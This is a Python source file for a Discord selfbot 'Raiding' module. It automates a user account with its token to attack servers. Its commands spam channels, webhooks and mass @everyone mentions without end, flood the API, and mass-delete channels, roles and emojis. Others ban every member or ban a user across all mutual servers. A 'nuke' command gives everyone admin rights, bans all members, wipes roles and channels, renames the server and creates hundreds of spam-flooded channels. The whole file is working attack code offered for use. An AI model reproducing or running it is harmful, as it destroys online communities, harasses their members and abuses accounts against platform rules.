import asyncio
import main
import selfcord as discord
import random
import aiohttp
import itertools
import aiosonic
import math
from colorama import Fore as F
from selfcord.ext import commands as vbot
from utils import req
from utils import alias
from utils.msg import delete_msg

class RaidCmds(
    vbot.Cog,
    name = "Raiding",
    description = "Various commands for spamming/raiding etc"):
  def __init__(self, bot):
    self.bot = bot
    
    #The channels the bot is going to create
    self.nuke_channels = [
      "arezium-did-not-do-this"
    ]
    #The messages the bot is going to spam
    self.nuke_messages = [
      "@everyone https://cdn.discordapp.com/attachments/1022064429099126835/1078581926123806831/TbQksokpSUbJ-1.mp4 @everyone"
    ]
    #The names of the webhooks
    self.nuke_names = [
      "arezium-did-not-do-this"
    ]
    #The name the server is going to get renamed to
    self.nuke_server_name = "GET NUKED"
    
  global is_nuking
  global is_clear
  global is_spamming

  is_nuking = False
  is_clear = False
  is_spamming = False

  @vbot.Cog.listener()
  async def on_raw_reaction_remove(self, payload):
    if int(payload.user_id) == int(self.bot.user.id) and payload.emoji.name == "❌":
      global is_spamming
      is_spamming = False
      
      print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Stopped spamming.")
      channel = self.bot.get_channel(payload.channel_id)
      msg = await channel.fetch_message(payload.message_id)
      
      await asyncio.sleep(3)
      await msg.delete()
      
  @vbot.group(
    name = "spam",
    description = f"Spams a message indefinitely until stopped by unreacting the spam command with ❌ or {main.prefix}spam stop",
    invoke_without_command = True
  )
  async def spam(self, ctx, *, message = "get spammed"):
    global is_spamming
    is_spamming = True
    
    msg = ctx.message
    await msg.add_reaction("❌")
    
    while is_spamming:
      # await spam.send_message(message, channel)
      try:
        await ctx.send(message)
      
      except discord.HTTPException:
        pass
      
  @spam.command(
    name = "channel",
    description = f"Spams a message indefinitely in the specified channel id until stopped by unreacting the spam command with ❌ or {main.prefix}spam stop (you need to surround the message with \"\". For example: \"get spammed\""
  )
  async def channel(self, ctx, message = "get spammed", channel_id: int = None):
    global is_spamming
    is_spamming = True
    msg = ctx.message

    if not channel_id:
      channel = ctx.channel

    else:
      channel = self.bot.get_channel(channel_id)
      await msg.edit(content = f"```yaml\n+ Now spamming in #{channel.name}```", delete_after = 5)
    
    await msg.add_reaction("❌")
    
    while is_spamming:
      try:
        # await spam.send_message(message, channel)
        await channel.send(message)
      
      except discord.HTTPException:
        pass
      
      except discord.MissingPermissions:
        pass
      
  @spam.command(
    name = "all",
    description = f"Spams a message in every channel indefinitely until stopped by unreacting the spam command with ❌ or {main.prefix}spam stop"
  )
  async def all(self, ctx, *, message = "get spammed"):
    global is_spamming
    is_spamming = True
    
    msg = ctx.message
    await msg.add_reaction("❌")
    
    while is_spamming:
      for channel in ctx.guild.text_channels:
        # await spam.send_message(message, channel)
        try:
          await channel.send(message)
          
        except discord.HTTPException:
          pass
        
        except discord.MissingPermissions:
          pass
        
  @spam.command(
    name = "web",
    description = f"Creates a webhook and spams it indefinitely until stopped by unreacting the spam command with ❌ or {main.prefix}spam stop (You will need to surround the name in quotation marks \"like this\")"
  )
  async def web(self, ctx, name, *, message = "get spammed"):
    global is_spamming
    is_spamming = True
    
    msg = ctx.message
    channel = ctx.channel
    await msg.add_reaction("❌")
    
    try:
      webhook = await channel.create_webhook(name = name)
      
      while is_spamming:
        await webhook.send(message)
        
      await webhook.delete()
    except discord.HTTPException:
      pass
    
    except discord.MissingPermissions:
      pass
      
  @spam.command(
    name = "fast",
    description = "Very fast spam that will probably get you ratelimited or API locked. Cannot be stopped",
    invoke_without_command = True
  )
  async def fast(self, ctx, amount: int = 20, *, message = "get spammed"):
    msg = ctx.message
    try: await msg.delete()
    except: pass
    
    async def send_msg():
      async with aiosonic.HTTPClient() as http:
        try:
          await http.post(
            f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages",
            headers = req.headers(main.token),
            json = {
              "content": message,
              "tts": "false",
              "flags": 0
            })
            
        except:
          pass
        
    coros = [send_msg() for _ in range(amount)]
    await asyncio.gather(*coros)
  
  @spam.command(
    name = "mention",
    description = "Mass mentions everyone in the server. Limit is how many mentions can be put in one message (Max is 150)"
  )
  async def mention(self, ctx, limit: int = 50):
    msg = ctx.message
    guild = ctx.guild
    
    if limit > 150:
      return await msg.edit(content = "```yaml\n- The max limit is 150.```", delete_after = 5)
    
    elif limit > guild.member_count:
      return await msg.edit(content = "```yaml\n- Limit cannot be bigger than the member count.```", delete_after = 5)
      
    global is_spamming
    is_spamming = True
  
    await msg.add_reaction("❌")
    
    mentions = [m.mention for m in guild.members if m != guild.me]
    max_msgs = math.ceil(len(mentions) / limit)
    count = 0
    msgs = []
    
    for mes in range(max_msgs):
      temp_str = ""
      while count < limit + mes * limit:
          try:
            temp_str += mentions[count]
            
          except:
            break
          
          count += 1
      
      msgs.append(temp_str)
    
    while is_spamming:
      for m in msgs:
        await ctx.send(m)
        
  @spam.command(
    name = "role",
    description = "Mass mentions every role in the server. Limit is how many mentions can be put in one message (Max is 150)"
  )
  async def rolem(self, ctx, limit: int = 10):
    msg = ctx.message
    guild = ctx.guild
    
    if limit > 150:
      return await msg.edit(content = "```yaml\n- The max limit is 150.```", delete_after = 5)
    
    elif limit > len(guild.roles):
      return await msg.edit(content = "```yaml\n- Limit cannot be bigger than the role count.```", delete_after = 5)
      
    
    global is_spamming
    is_spamming = True
  
    await msg.add_reaction("❌")
    
    mentions = [r.mention for r in guild.roles]
    max_msgs = math.ceil(len(mentions) / limit)
    count = 0
    msgs = []
    
    for mes in range(max_msgs):
      temp_str = ""
      while count < limit + mes * limit:
          try:
            temp_str += mentions[count]
            
          except:
            break
          
          count += 1
      
      msgs.append(temp_str)
    
    while is_spamming:
      for m in msgs:
        await ctx.send(m)
  
  @spam.command(
    name = "stop",
    description = "Stops spam if there is any going on"
  )
  async def stop(self, ctx):
    global is_spamming
    msg = ctx.message
    
    if is_spamming:
      is_spamming = False
      await msg.edit(content = f"```yaml\n+ Stopped spam.```", delete_after = 5)
    
    elif not is_spamming:
      await msg.edit(content = f"```yaml\n- There is no spam going on.```", delete_after = 5)

  @vbot.command(
    name = "gcname",
    description = "Changes your current group chat's name a lot"
  )
  async def gcname(self, ctx, amount: int = 20, *, name):
    msg = ctx.message
    
    if not isinstance(ctx.channel, discord.GroupChannel):
      await msg.edit(content = f"```yaml\n- You are not in a group chat.```", delete_after = 5)
    
    else:
      await delete_msg(msg)
      gc = ctx.channel
      
      for i in range(amount):
        try:
          await gc.edit(name = f"{name} {i + 1}")
          
        except:
          pass
          
  @vbot.group(
    name = "channel",
    description = "Channel raiding commands",
    invoke_without_command = True
  )
  async def channel(self, ctx):
    msg = ctx.message
    await msg.edit(content=f"```yaml\n- Incorrect usage. Correct usage: {main.prefix}help [channel]```", delete_after = 5)
  
  @channel.command(
    name = "delete",
    description = "Deletes all channels in a server (You can put a name so it only deletes channels with said name)",
    aliases = alias.get_aliases("channeldelete")
  )
  async def channeldelete(self, ctx, name = None):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    async def del_channel(channel):
      try:
        if name is None:
          await channel.delete()
          print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted channel {F.LIGHTBLUE_EX}#{channel.name}")
          
        else:
          if channel.name == name:
            await channel.delete()
            print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted channel {F.LIGHTBLUE_EX}#{channel.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to delete channel {F.LIGHTBLUE_EX}#{channel.name}\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")

    coros = [del_channel(channel) for channel in guild.channels]
    await asyncio.gather(*coros)

  @channel.command(
    name = "create",
    description = "Mass-creates channels in a server",
    aliases = alias.get_aliases("channelcreate")
  )
  async def channelcreate(self, ctx, amount: int = 25, *, cname):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    async def create_channel():
      try:
        channel = await guild.create_text_channel(name = cname)
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully made channel with name {F.LIGHTBLUE_EX}#{channel.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make channel with name {F.LIGHTBLUE_EX}#{channel.name}\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")
      
    coros = [create_channel() for _ in range(amount)]
    await asyncio.gather(*coros)

  @vbot.group(
    name = "role",
    description = "Role raiding commands",
    invoke_without_command = True
  )
  async def role(self, ctx):
    msg = ctx.message
    await msg.edit(content=f"```yaml\n- Incorrect usage. Correct usage: {main.prefix}help [role]```", delete_after = 5)
      
  @role.command(
    name = "create",
    description = "Mass-creates roles in a server",
    aliases = alias.get_aliases("rolecreate")
  )
  async def rolecreate(self, ctx, amount: int = 25, *, rname):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    colors_list = [
      [
        0x42a7ff,
        0x27a7a3,
        0x037c75
      ], [
        0x01f97f,
        0x06b775,
        0x01f1b4
      ], [
        0x5f00ff,
        0x4e04cc,
        0x3c0991
      ]
    ]
    
    colors = itertools.cycle(random.choice(colors_list))
    
    async def make_role():
      try:
        role = await guild.create_role(name = rname, color = next(colors))
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully made role with name {F.LIGHTBLUE_EX}{role.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make role with name {F.LIGHTBLUE_EX}{role.name}\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")
      
    coros = [make_role() for _ in range(amount)]
    await asyncio.gather(*coros)
      
  @role.command(
    name = "delete",
    description = "Deletes all the roles in a server (You can put a name so it only deletes roles with said name)",
    aliases = alias.get_aliases("roledelete")
  )
  async def roledelete(self, ctx, *, rname = None):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    async def delete_role(role):
      try:
        if rname is None:
          await role.delete()
          print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted role {F.LIGHTBLUE_EX}{role.name}")
          
        else:
          if role.name == rname:
            await role.delete()
            print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted role {F.LIGHTBLUE_EX}{role.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to delete role {F.LIGHTBLUE_EX}{role.name}\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")
        
    coros = [delete_role(role) for role in guild.roles[1:]]
    await asyncio.gather(*coros)
  
  @vbot.group(
    name = "emoji",
    description = "Emoji raiding commands",
    invoke_without_command = True
  )
  async def emoji(self, ctx):
    msg = ctx.message
    await msg.edit(content=f"```yaml\n- Incorrect usage. Correct usage: {main.prefix}help [channel]```", delete_after = 5)
    
  @emoji.command(
    name = "create",
    description = "Create an amount of emojis with a name and image"
  )
  async def emojicreate(self, ctx, amount: int, link, *, name):
    msg = ctx.message
    guild = ctx.guild
    
    if len(name) < 2:
      return await msg.edit(content = f"```yaml\nEmoji name must be longer than 2 characters.```", delete_after = 5)
    
    async def make_emoji(img):
      try:
        emoji = await guild.create_custom_emoji(name = name, image = img)
        print(f"{F.GREEN}[+]{F.LIGHTWHITE_EX} Succesfully made emoji with name {F.LIGHTBLUE_EX}{emoji.name}")
      
      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make emoji\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")
    
    try:
      async with aiosonic.HTTPClient() as http:
        img = await http.get(link)
        img = await img.content()
        
      coros = [make_emoji(img) for _ in range(amount)]
      await asyncio.gather(*coros)

    except Exception as e:
      await msg.edit(content = f"```yaml\n- An unknown error occurred: {e}```", delete_after = 5)
      
  @emoji.command(
    name = "delete",
    description = "Deletes every emoji in a server (You can put a name so it only deletes emojis with said name)"
  )
  async def delete(self, ctx, *, name = None):
    msg = ctx.message
    guild = ctx.guild
    
    async def delete_emoji(emoji):
      try:
        if name is None:
          await emoji.delete()
          print(f"{F.GREEN}[+]{F.LIGHTWHITE_EX} Succesfully deleted emoji with name {emoji.name}")
        
        else:
          if emoji.name == name:
            await emoji.delete()
            print(f"{F.GREEN}[+]{F.LIGHTWHITE_EX} Succesfully deleted emoji with name {emoji.name}")
      
      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to delete emoji.\n    Error: {F.RED}{e}{F.LIGHTWHITE_EX}")
    
    try:
      coros = [delete_emoji(emoji) for emoji in guild.emojis]
      await asyncio.gather(*coros)
      await delete_msg(msg)

    except Exception as e:
      await msg.edit(content = f"```yaml\n- An unknown error occurred: {e}```", delete_after = 5)

  @vbot.command(
    name = "massinvite",
    description = "Creates a lot of invites",
    aliases = alias.get_aliases("massinvite")
  )
  async def massinvite(self, ctx, amount: int = 20):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    ages = [0, 604800, 86400, 43200, 21600, 3600, 1800]
    uses = [0, 100, 50, 25, 10, 5, 1]
    channel_count = 0
    channel = guild.text_channels[channel_count]
    delay = 0.5
    
    for i in range(amount):      
      try:
        await channel.create_invite(max_age = random.choice(ages), max_uses = random.choice(uses))
        print(f"{F.GREEN}[+]{F.LIGHTWHITE_EX} Succesfully made invite {F.LIGHTBLUE_EX}#{i + 1}{F.LIGHTWHITE_EX} in channel {F.LIGHTBLUE_EX}#{channel.name}{F.LIGHTWHITE_EX}")
      
      except discord.Forbidden:
        channel_count = 0
        channel = guild.text_channels[channel_count]
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make invite {F.LIGHTBLUE_EX}#{i + 1}{F.LIGHTWHITE_EX} in channel {F.LIGHTBLUE_EX}#{channel.name}{F.LIGHTWHITE_EX}.\n    Error: {F.RED}{e}\n    New Channel: {F.LIGHTBLUE_EX}#{channel.name}")

      except discord.HTTPException as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make invite {F.LIGHTBLUE_EX}#{i + 1}{F.LIGHTWHITE_EX} in channel {F.LIGHTBLUE_EX}#{channel.name}{F.LIGHTWHITE_EX}.\n    Error: {F.RED}{e}\n    New Delay: {F.LIGHTBLUE_EX}{delay}")
        delay += 0.5
        
      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make invite {F.LIGHTBLUE_EX}#{i + 1}{F.LIGHTWHITE_EX} in channel {F.LIGHTBLUE_EX}#{channel.name}{F.LIGHTWHITE_EX}.\n    Error: {F.RED}{e}")

      await asyncio.sleep(delay)

  @vbot.command(
    name = "banall",
    description = "Bans every member in the server"
  )
  async def banall(self, ctx):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    async def ban_member(member):
      if member == guild.me:
        return
      
      try:
        await member.ban(reason = "Banned by VBot")
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully banned member {member}")
        
      except:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to ban member {member}")
    
    coros = [ban_member(member) for member in guild.members]
    await asyncio.gather(*coros)
        
  @vbot.command(
    name = "unbanall",
    description = "Unbans every member in the server"
  )
  async def unbanall(self, ctx):
    msg = ctx.message
    guild = ctx.guild
    
    await msg.delete()
    
    async def unban_member(banned):
      member = banned.user
      try:
        await member.unban(reason = "Unbanned by VBot")
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully unbanned member {member}")
        
      except:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to unban member {member}")
        
    coros = [unban_member(banned) for banned in await guild.bans()]
    await asyncio.gather(*coros)
    
  @vbot.command(
    name = "mutualban",
    description = "Tries to ban someone in every mutual server with them"
  )
  async def mutualban(self, ctx, user: discord.User):
    msg = ctx.message
    await msg.delete()
    
    async with aiohttp.ClientSession() as session:
      async with session.get(
        f"https://discord.com/api/v9/users/{user.id}/profile?with_mutual_guilds=true&with_mutual_friends_count=false",
        headers = req.headers(main.token)
      ) as r:
        js = await r.json()
        mutuals = js["mutual_guilds"]
        ids = []
        for server in mutuals:
          ids.append(server["id"])
      
      for id in ids:
        try:
          guild = self.bot.get_guild(int(id))
          member = await guild.fetch_member(user.id)
          
        except:
          print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to ban user {F.LIGHTBLUE_EX}{user}{F.LIGHTWHITE_EX}")

        try:
          await member.ban()
          print(f"{F.GREEN}[+]{F.LIGHTWHITE_EX} Succesfully banned user {F.LIGHTBLUE_EX}{user}{F.LIGHTWHITE_EX}")
        
        except:
          print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to ban user {F.LIGHTBLUE_EX}{user}{F.LIGHTWHITE_EX}")

  @vbot.command(
    name = "nuke",
    description = "Nukes a server (can get you ratelimited + there is no way to stop this cmd lol)",
    aliases = alias.get_aliases("nuke")
  )
  async def nuke(self, ctx, server_id: int=None):
    global is_nuking
    is_nuking = True
    try:
      if not server_id:
        guild = ctx.guild
    
      else:
        guild = self.bot.get_guild(server_id)
    
    except:
      return

    await ctx.message.delete()

    print(f"{F.LIGHTBLACK_EX}[?]{F.LIGHTWHITE_EX} Starting nuke in {guild.name}")

    try:
      everyone = discord.utils.get(guild.roles, name = "@everyone")
      perms = discord.Permissions.all()
      await everyone.edit(permissions=perms)
      
      print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully gave everyone admin permissions")
      
    except Exception as e:
      print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to give everyone admin permissions\n    Error: {F.RED}{e}")

    async for ban_user in guild.bans():
      member = ban_user.user
      try:
        await member.unban()
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully unbanned member {member}")
        
      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to unban member {member}\n    Error: {F.RED}{e}")

    for member in guild.members:
      if member == guild.me:
        continue
      
      try:
        await member.ban(reason = "Nuked by VBot")
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully banned member {member}")
        
      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to ban member {member}\n    Error: {F.RED}{e}")

    for role in guild.roles[1:]:
      try:
        await role.delete()
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted role {role.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to delete role {role.name}\n    Error: {F.RED}{e}")

    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully deleted channel {channel.name}")

      except Exception as e:
        print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to delete channel #{channel.name}\n    Error: {F.RED}{e}")

    try:
      await guild.edit(name = self.nuke_server_name)
      print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully changed server name to {self.nuke_server_name}")

    except Exception as e:
      print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to change server name to {self.nuke_server_name}\n    Error: {F.RED}{e}")
      
    try:
      channel = await guild.create_text_channel(name = "𝙣𝙪𝙠𝙚𝙙 𝙗𝙮 𝙫𝙗𝙤𝙩")
      inv = await channel.create_invite(max_age = 0, max_uses = 0)
      print(f"{F.LIGHTGREEN_EX}[+]{F.LIGHTWHITE_EX} Succesfully made invite: {inv}")

    except Exception as e:
      print(f"{F.RED}[-]{F.LIGHTWHITE_EX} Failed to make invite\n    Error: {F.RED}{e}")
    
    for _ in range(499):
      try:
        channel = await guild.create_text_channel(name = random.choice(self.nuke_channels))
      except:
        pass

  @vbot.Cog.listener()
  async def on_guild_channel_create(self, channel):
    global is_nuking
    if is_nuking == False:
      return

    try: 
      webhook = await channel.create_webhook(name = "Get nuked")

      async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook.url), session = session)
        while 1:
          await webhook.send(random.choice(self.nuke_messages), username = random.choice(self.nuke_names))
          
    except:
      pass

if __name__ == "__main__":
    print("You need to run main.py to run the bot")

async def setup(bot):
  await bot.add_cog(RaidCmds(bot))
